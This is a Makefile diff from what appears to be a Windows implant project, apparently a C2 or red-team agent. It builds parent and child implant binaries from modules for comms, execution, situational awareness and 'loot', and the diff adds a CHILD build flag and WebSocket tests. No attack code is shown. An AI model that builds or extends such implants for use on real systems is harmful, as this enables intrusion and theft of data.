@@ -35,7 +35,7 @@ bin/test_loot.exe : tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/b
 	$(CXX) -g tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/base64/base64.cpp -o bin/test_loot.exe -lshlwapi -lurlmon -lcrypt32
 
 main_implant : main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp $(headers)
-	$(CXX) main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp libs/base64/base64.cpp libdatachannel.dll -lwinhttp -lcrypt32 -lbcrypt -lshlwapi -lurlmon -o bin/main_implant.exe
+	$(CXX) -DCHILD main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp libs/base64/base64.cpp libdatachannel.dll -lwinhttp -lcrypt32 -lbcrypt -lshlwapi -lurlmon -o bin/main_implant.exe
 
 main_implant_parent : main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp $(headers)
 	$(CXX) main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp libs/base64/base64.cpp libdatachannel.dll -lwinhttp -lcrypt32 -lbcrypt -lshlwapi -lurlmon -o bin/main_implant_parent.exe
@@ -43,6 +43,10 @@ main_implant_parent : main_implant.cpp comms/comms.cpp execution/execution.cpp s
 
 test_rtc:
 	$(CXX) tests/test_rtc.cpp libdatachannel.dll -o bin/test_rtc.exe
+
+test_ws: test_ws/test_parent.cpp test_ws/test_child.cpp
+	$(CXX) test_ws/test_parent.cpp libdatachannel.dll -lWs2_32 -o bin/test_parent.exe
+	$(CXX) test_ws/test_child.cpp libdatachannel.dll -lWs2_32 -o bin/test_child.exe
 
 clean :
 	$(RM) bin/*.exe
